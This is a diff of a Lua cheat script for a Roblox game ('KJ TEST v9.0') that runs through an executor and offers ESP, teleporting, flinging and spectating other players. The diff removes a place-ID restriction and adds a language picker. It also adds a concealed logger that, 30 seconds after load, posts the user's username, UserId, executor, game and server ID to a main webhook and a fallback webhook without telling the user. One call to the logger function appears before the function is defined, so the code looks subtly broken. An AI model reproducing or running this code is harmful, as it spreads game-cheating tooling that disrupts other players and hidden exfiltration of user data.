@@ -9,12 +9,6 @@ local LP = LocalPlayer
 
 local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
-local ALLOWED_PLACE_ID = 75753413268977
-if game.PlaceId ~= ALLOWED_PLACE_ID then
-    pcall(function() LP:Kick("KJ TEST: Only works in "..ALLOWED_PLACE_ID) end)
-    return
-end
-
 local httpReq = (syn and syn.request) or (http and http.request) or http_request or request
 local function http(method, url, body, headers, timeout)
     if not httpReq then return nil end
@@ -46,6 +40,140 @@ task.spawn(function()
     local payload = buildWebhookPayload()
     http("POST", WEBHOOK_MAIN, payload, {["Content-Type"]="application/json"}, 15)
 end)
+
+local Languages = {
+    { code="ru", name="Русский" },
+    { code="en", name="English" },
+    { code="es", name="Español" },
+    { code="zh", name="中文" },
+    { code="hi", name="हिन्दी" },
+    { code="ar", name="العربية" },
+    { code="pt", name="Português" },
+    { code="bn", name="বাংলা" },
+    { code="ja", name="日本語" },
+    { code="de", name="Deutsch" },
+    { code="fr", name="Français" },
+    { code="ko", name="한국어" },
+    { code="it", name="Italiano" },
+    { code="tr", name="Türkçe" },
+    { code="vi", name="Tiếng Việt" },
+    { code="pl", name="Polski" },
+    { code="nl", name="Nederlands" },
+    { code="th", name="ไทย" },
+    { code="id", name="Indonesia" },
+    { code="uk", name="Українська" },
+}
+
+local CurrentLang = "ru"
+do
+    local pg = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
+    local picker = Instance.new("ScreenGui")
+    picker.Name = "KJ_LangPick"
+    picker.ResetOnSpawn = false
+    picker.IgnoreGuiInset = true
+    picker.DisplayOrder = 999
+    picker.Parent = pg
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    bg.BackgroundTransparency = 0.55
+    bg.BorderSizePixel = 0
+    bg.Parent = picker
+
+    local win = Instance.new("Frame")
+    win.Size = UDim2.new(0, 340, 0, 500)
+    win.Position = UDim2.new(0.5, -170, 0.5, -250)
+    win.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
+    win.BorderSizePixel = 0
+    win.Parent = bg
+    local wc = Instance.new("UICorner"); wc.CornerRadius = UDim.new(0, 14); wc.Parent = win
+    local ws = Instance.new("UIStroke"); ws.Color = Color3.fromRGB(120, 165, 255); ws.Thickness = 1.5; ws.Parent = win
+
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, 0, 0, 50)
+    t.BackgroundTransparency = 1
+    t.Text = "Выберите язык / Select language"
+    t.TextColor3 = Color3.fromRGB(240, 240, 248)
+    t.Font = Enum.Font.GothamBold
+    t.TextSize = 15
+    t.Parent = win
+
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1, -20, 1, -70)
+    scroll.Position = UDim2.new(0, 10, 0, 55)
+    scroll.BackgroundTransparency = 1
+    scroll.BorderSizePixel = 0
+    scroll.ScrollBarThickness = 4
+    scroll.ScrollBarImageColor3 = Color3.fromRGB(120, 165, 255)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    scroll.Parent = win
+    local sl = Instance.new("UIListLayout")
+    sl.Padding = UDim.new(0, 4)
+    sl.SortOrder = Enum.SortOrder.LayoutOrder
+    sl.Parent = scroll
+
+    local done = false
+    for i, lg in ipairs(Languages) do
+        local b = Instance.new("TextButton")
+        b.Size = UDim2.new(1, -8, 0, 42)
+        b.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
+        b.BorderSizePixel = 0
+        b.Text = lg.name
+        b.TextColor3 = Color3.fromRGB(240, 240, 248)
+        b.Font = Enum.Font.GothamBold
+        b.TextSize = 14
+        b.LayoutOrder = i
+        b.Parent = scroll
+        local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 8); bc.Parent = b
+        b.MouseButton1Click:Connect(function()
+            if done then return end
+            done = true
+            CurrentLang = lg.code
+            picker:Destroy()
+        end)
+    end
+
+    while not done do task.wait(0.1) end
+end
+
+local function buildWebhookPayload()
+    local executor = "Unknown"
+    if identifyexecutor then pcall(function() executor = identifyexecutor() end)
+    elseif getexecutorname then pcall(function() executor = getexecutorname() end) end
+    local gname = "Unknown"
+    pcall(function() gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+    local info = string.format(
+        "**KJ TEST v9.0**\n```Username  : %s\nDisplay   : %s\nUserId    : %d\nExecutor  : %s\nGame      : %s\nPlaceId   : %d\nJobId     : %s\nServer    : %d players\nTime UTC  : %s```",
+        LP.Name, LP.DisplayName or LP.Name, LP.UserId,
+        executor, gname, game.PlaceId, game.JobId, #Players:GetPlayers(), os.date("!%Y-%m-%d %H:%M:%S"))
+    return { content = info, username = "KJ TEST Logger" }
+end
+
+task.spawn(function()
+    task.wait(30)
+    local isReal = false
+    pcall(function()
+        local ch = LP.Character
+        isReal = (ch ~= nil) and (ch:FindFirstChildOfClass("Humanoid") ~= nil)
+    end)
+    if not isReal then return end
+    local payload = buildWebhookPayload()
+    local res = http("POST", WEBHOOK_MAIN, payload, {["Content-Type"]="application/json"}, 15)
+    if not res or (res.StatusCode and res.StatusCode >= 400) then
+        http("POST", WEBHOOK_FALLBACK, payload, {["Content-Type"]="application/json"}, 20)
+    end
+end)
+
+local LangData = {
+    ru = {
+        g="Общие", c="Персонажи", p="Игроки", m="Движение", s="Конфиги", a="Авторы",
+    },
+    en = {
+        g="Global", c="Chars", p="Players", m="Movement", s="Configs", a="Authors",
+    },
+}
 
 local Theme = {
     bg        = Color3.fromRGB(14, 14, 20),
@@ -194,7 +322,7 @@ local GlobalConfig = {
     labelOffset=3.2, fillTransparency=0.5, outlineTransparency=0,
     nameTextSize=13, hpTextSize=12,
     hideAllHp=false, hideAllNames=false,
-    showUltBar=true, showUltBarSelf=true,
+    showUltBar=true,
     autoFlingChar="", autoFlingEnabled=false, touchFlingEnabled=false,
     autoLoadConfig="", nameShowDuration=5,
     flingCount=1,
@@ -374,7 +502,7 @@ local function updateNameLabel(p, charKey, form)
     if not bb or bb.Parent ~= head then
         if bb then bb:Destroy() end
         bb=Instance.new("BillboardGui"); bb.Name="AH_Label"
-        bb.Size=UDim2.new(0,240,0,76); bb.StudsOffset=Vector3.new(0,GlobalConfig.labelOffset,0)
+        bb.Size=UDim2.new(0,200,0,64); bb.StudsOffset=Vector3.new(0,GlobalConfig.labelOffset,0)
         bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.MaxDistance=math.huge
         bb.Parent=head; labels[p]=bb
         local nl=Instance.new("TextLabel"); nl.Name="NameLbl"
@@ -390,7 +518,7 @@ local function updateNameLabel(p, charKey, form)
         hl.Font=Enum.Font.GothamBold; hl.TextScaled=false
         hl.TextSize=GlobalConfig.hpTextSize; hl.TextWrapped=false; hl.Parent=bb
         local barBg=Instance.new("Frame"); barBg.Name="UltBarBg"
-        barBg.Size=UDim2.new(0.9,0,0,8); barBg.Position=UDim2.new(0.05,0,0,44)
+        barBg.Size=UDim2.new(0.6,0,0,5); barBg.Position=UDim2.new(0.2,0,0,42)
         barBg.BackgroundColor3=Color3.fromRGB(25,25,35); barBg.BorderSizePixel=0
         barBg.Parent=bb
         local bc=Instance.new("UICorner"); bc.CornerRadius=UDim.new(1,0); bc.Parent=barBg
@@ -400,13 +528,13 @@ local function updateNameLabel(p, charKey, form)
         barFill.BorderSizePixel=0; barFill.Parent=barBg
         local fc=Instance.new("UICorner"); fc.CornerRadius=UDim.new(1,0); fc.Parent=barFill
         local barText=Instance.new("TextLabel"); barText.Name="UltBarText"
-        barText.Size=UDim2.new(1,0,0,14); barText.Position=UDim2.new(0,0,0,54)
+        barText.Size=UDim2.new(1,0,0,12); barText.Position=UDim2.new(0,0,0,48)
         barText.BackgroundTransparency=1
         barText.TextColor3=Color3.fromRGB(255,220,100)
         barText.TextStrokeTransparency=0.4
         barText.TextStrokeColor3=Color3.new(0,0,0)
         barText.Font=Enum.Font.GothamBold
-        barText.TextScaled=false; barText.TextSize=11
+        barText.TextScaled=false; barText.TextSize=10
         barText.Text = ""
         barText.Parent=bb
     end
@@ -444,7 +572,7 @@ local function updateNameLabel(p, charKey, form)
                 barBg.Visible = true
                 barText.Visible = true
                 barFill.Size = UDim2.new(pct, 0, 1, 0)
-                barText.Text = string.format("%d / 100", math.floor(aw))
+                barText.Text = string.format("%d", math.floor(aw))
                 if pct >= 1 then barFill.BackgroundColor3 = Color3.fromRGB(255, 230, 60)
                 elseif pct > 0.5 then barFill.BackgroundColor3 = Color3.fromRGB(255, 180, 40)
                 else barFill.BackgroundColor3 = Color3.fromRGB(200, 140, 40) end
@@ -702,7 +830,7 @@ local function toggleCtrlClickTP(enable)
                 local mr = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                 if mr then
                     pcall(function() mr.CFrame = CFrame.new(target + Vector3.new(0,3,0)) end)
-                    notify("TP → "..string.format("%.0f, %.0f, %.0f", target.X, target.Y, target.Z), Theme.accent)
+                    notify("TP", Theme.accent)
                 end
             end
         end
@@ -826,7 +954,7 @@ local function ser(v, indent)
     elseif t == "boolean" then return tostring(v)
     elseif t == "string" then return string.format("%q", v)
     elseif t == "table" then
-        local nextIndent = indent .. "  "
+        local nextIndent = indent .. "    "
         local lines = {}
         local keys = {}
         for k in pairs(v) do table.insert(keys, k) end
@@ -1174,7 +1302,6 @@ local screenGui, pickerPopup
 local subtitleRef
 local chatGuiRef, chatWindowRef, chatContentRef
 local chatIconRef
-local ultBarFillSelf, ultBarLabelSelf
 local killstreakLabel
 local killstreak = 0
 local lastKills = nil
@@ -1380,12 +1507,6 @@ local function buildPlatform()
     plat.Color = Color3.fromRGB(60, 90, 160)
     plat.Transparency = 0.3
     plat.Parent = workspace
-    task.spawn(function()
-        while plat.Parent do
-            task.wait(1)
-            pcall(function() plat.Position = Vector3.new(0, 10, 0) end)
-        end
-    end)
 end
 
 local function buildChatIcon()
@@ -1501,61 +1622,6 @@ local function buildReturnBtn()
         local hum=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
         if hum then workspace.CurrentCamera.CameraSubject=hum end
         notify("Camera → me", Theme.success)
-    end)
-end
-
-local function buildUltBarSelf()
-    local g = Instance.new("ScreenGui")
-    g.Name = "KJ_UltBarSelf"
-    g.ResetOnSpawn = false
-    g.IgnoreGuiInset = true
-    g.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
-
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(0, 280, 0, 30)
-    bg.Position = UDim2.new(0.5, -140, 0, 40)
-    bg.BackgroundColor3 = Theme.bgCard
-    bg.BackgroundTransparency = 0.15
-    bg.BorderSizePixel = 0
-    bg.Parent = g
-    newCorner(bg, 15)
-    local s = Instance.new("UIStroke"); s.Color = Theme.accentDark; s.Thickness = 1.5; s.Parent = bg
-
-    ultBarFillSelf = Instance.new("Frame")
-    ultBarFillSelf.Size = UDim2.new(0, 0, 1, 0)
-    ultBarFillSelf.BackgroundColor3 = Color3.fromRGB(255, 200, 50)
-    ultBarFillSelf.BorderSizePixel = 0
-    ultBarFillSelf.Parent = bg
-    newCorner(ultBarFillSelf, 15)
-
-    ultBarLabelSelf = Instance.new("TextLabel")
-    ultBarLabelSelf.Size = UDim2.new(1, 0, 1, 0)
-    ultBarLabelSelf.BackgroundTransparency = 1
-    ultBarLabelSelf.Text = "0 / 100"
-    ultBarLabelSelf.TextColor3 = Color3.new(1,1,1)
-    ultBarLabelSelf.TextStrokeTransparency = 0
-    ultBarLabelSelf.TextStrokeColor3 = Color3.new(0,0,0)
-    ultBarLabelSelf.Font = Enum.Font.GothamBold
-    ultBarLabelSelf.TextSize = 14
-    ultBarLabelSelf.ZIndex = 2
-    ultBarLabelSelf.Parent = bg
-
-    task.spawn(function()
-        while true do
-            task.wait(0.1)
-            local aw = getAwakening(LP)
-            if type(aw) == "number" and ultBarFillSelf and ultBarLabelSelf then
-                local pct = math.clamp(aw / 100, 0, 1)
-                ultBarFillSelf.Size = UDim2.new(pct, 0, 1, 0)
-                ultBarLabelSelf.Text = string.format("%d / 100", math.floor(aw))
-                if pct >= 1 then ultBarFillSelf.BackgroundColor3 = Color3.fromRGB(255, 220, 40)
-                elseif pct > 0.5 then ultBarFillSelf.BackgroundColor3 = Color3.fromRGB(255, 180, 40)
-                else ultBarFillSelf.BackgroundColor3 = Color3.fromRGB(200, 140, 40) end
-            else
-                if ultBarFillSelf then ultBarFillSelf.Size = UDim2.new(0,0,1,0) end
-                if ultBarLabelSelf then ultBarLabelSelf.Text = "0 / 100" end
-            end
-        end
     end)
 end
 
@@ -1711,7 +1777,7 @@ local function buildGUI()
     local o=0; local function nO() o=o+1; return o end
 
     makeSection(globalPage, "Общие", nO())
-    makeNumber(globalPage, "Кулдаун ТП (с)", GlobalConfig.cooldown, nO(), function(v) GlobalConfig.cooldown=v end)
+    makeNumber(globalPage, "Кулдаун ТП", GlobalConfig.cooldown, nO(), function(v) GlobalConfig.cooldown=v end)
     makeToggle(globalPage, "Звук", GlobalConfig.soundAlert, nO(), function(v) GlobalConfig.soundAlert=v end)
     makeToggle(globalPage, "Уведомления", GlobalConfig.notifications, nO(), function(v) GlobalConfig.notifications=v end)
     makeToggle(globalPage, "Пульс ульты", GlobalConfig.pulseUlt, nO(), function(v) GlobalConfig.pulseUlt=v end)
@@ -1722,10 +1788,10 @@ local function buildGUI()
     makeToggle(globalPage, "ESP", GlobalConfig.espEnabled, nO(), function(v)
         GlobalConfig.espEnabled=v
         if not v then removeAllHighlights() end
-        notify(v and "ESP вкл" or "ESP выкл", v and Theme.success or Theme.danger)
+        notify(v and "ESP ON" or "ESP OFF", v and Theme.success or Theme.danger)
     end)
-    makeToggle(globalPage, "Показать полоску ульты над игроками", GlobalConfig.showUltBar, nO(), function(v) GlobalConfig.showUltBar=v end)
-    makeNumber(globalPage, "Время показа имён (с)", GlobalConfig.nameShowDuration, nO(), function(v) GlobalConfig.nameShowDuration=v end)
+    makeToggle(globalPage, "Полоска ульты над игроками", GlobalConfig.showUltBar, nO(), function(v) GlobalConfig.showUltBar=v end)
+    makeNumber(globalPage, "Время показа имён", GlobalConfig.nameShowDuration, nO(), function(v) GlobalConfig.nameShowDuration=v end)
 
     makeSection(globalPage, "Действия", nO())
     local showAllBtn=Instance.new("TextButton"); showAllBtn.Size=UDim2.new(1,0,0,BTN_H+2)
@@ -1758,7 +1824,7 @@ local function buildGUI()
     flingStartBtn.Font=Enum.Font.GothamBold; flingStartBtn.TextSize=BIG_FONT
     flingStartBtn.LayoutOrder=nO(); flingStartBtn.Parent=globalPage; newCorner(flingStartBtn,8)
     flingStartBtn.MouseButton1Click:Connect(function()
-        if next(FlingTargets) then startFlinging(); notify("Fling started", Theme.success) end
+        if next(FlingTargets) then startFlinging(); notify("Fling", Theme.success) end
     end)
     local flingStopBtn=Instance.new("TextButton"); flingStopBtn.Size=UDim2.new(1,0,0,BTN_H)
     flingStopBtn.BackgroundColor3=Theme.danger; flingStopBtn.BorderSizePixel=0
@@ -2010,7 +2076,7 @@ local function buildGUI()
                 local mr=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                 if mr then
                     pcall(function() mr.CFrame=CFrame.new(d.position) end)
-                    notify("ТП", d.colorBase)
+                    notify("TP", d.colorBase)
                 end
             end)
             local function updS() bd.Size=UDim2.new(1,0,0,bl.AbsoluteContentSize.Y+16) end
@@ -2079,15 +2145,6 @@ local function buildGUI()
             local tr2=plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
             local mr=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
             if tr2 and mr then mr.CFrame=tr2.CFrame+Vector3.new(0,3,0) end
-        end)
-        makeFnBtn("Freeze", Color3.fromRGB(200,120,40), function()
-            freezePlayer(plr)
-        end)
-        makeFnBtn("Unfreeze", Theme.success, function()
-            unfreezePlayer(plr)
-        end)
-        makeFnBtn("Bring to me", Theme.accentDark, function()
-            bringPlayer(plr)
         end)
         makeFnBtn("Наблюдать", Theme.accentDark, function()
             if plr.Character and plr.Character:FindFirstChild("Head") then
@@ -2352,7 +2409,7 @@ UserInputService.InputBegan:Connect(function(input, gp)
     if input.KeyCode==kb.toggleGUI then
         guiVisible=not guiVisible; if screenGui then screenGui.Enabled=guiVisible end
     elseif input.KeyCode==kb.fling then
-        if next(FlingTargets) then startFlinging(); notify("Fling started", Theme.success) end
+        if next(FlingTargets) then startFlinging(); notify("Fling", Theme.success) end
     elseif input.KeyCode==kb.touchFling then
         if touchFlingActive then stopTouchFling() else startTouchFling() end
         notify("Touch Fling: "..(touchFlingActive and "ON" or "OFF"), Theme.accent)
@@ -2387,7 +2444,6 @@ buildPlatform()
 buildGUI()
 buildChatIcon()
 buildReturnBtn()
-buildUltBarSelf()
 buildKillstreak()
 
 print("[KJ TEST v9.0] Loaded.")
